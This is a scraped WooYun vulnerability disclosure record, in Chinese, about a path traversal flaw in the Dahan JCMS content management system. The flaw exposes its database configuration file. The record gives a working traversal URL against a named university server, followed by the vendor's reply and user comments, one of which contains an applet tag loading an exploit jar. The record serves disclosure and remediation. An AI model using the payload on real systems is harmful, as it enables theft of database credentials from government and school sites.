{"id": 5349, "wybug_id": "wooyun-2013-046837", "wybug_title": "大汉版通JCMS数据库配置文件读取漏洞", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "xcoder", "wybug_date": "2013-12-24 10:42", "wybug_open_date": "2014-03-24 10:43", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-24：\t细节向公众公开  简要描述： 大汉JCMS内容管理系统由于对文件读取时没有对文件路径进行过滤，导致可以直接直接读取数据库配置文件，该产品政府部门以及学校使用较多，可导致数据库泄露或者getshell 详细说明：  由于读取xml文件时没有对传进的参数进行过滤，flowcode参数可控，配置文件地址WEB-INF/config/dbconfig.xml，由于控制了文件后缀，只能读取xml文件漏洞证明:\nhttp://netcenter.cau.edu.cn/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig\n\n\n   漏洞证明：  由于读取xml文件时没有对传进的参数进行过滤，flowcode参数可控，配置文件地址WEB-INF/config/dbconfig.xml，由于控制了文件后缀，只能读取xml文件漏洞证明:\nhttp://netcenter.cau.edu.cn/jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig\n\n\n   修复方案：  权限控制，参数过滤   版权声明：转载请注明来源 xcoder@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-12-24 15:50 厂商回复： 已收到，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-24 11:50 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  还有哪些产品都上啊    \n     2013-12-24 15:55 |    \t\t刺刺 \t\t\t( 普通白帽子  |\t\t\t        Rank:603 漏洞数:52        | 真正的安全并不是技术，而是人类善良的心灵...)\t\t \n  纯支持啊！···恭贺发财！    \n     2013-12-24 16:07 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  都发出来吧，我等着呢    \n     2014-05-02 22:03 |    \t\txcoder \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:9        | 一个世界有你，一个世界没有你，让两者的不...)\t\t \n  <applet archive=\"exp.jar\" code=\"\"></applet>    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}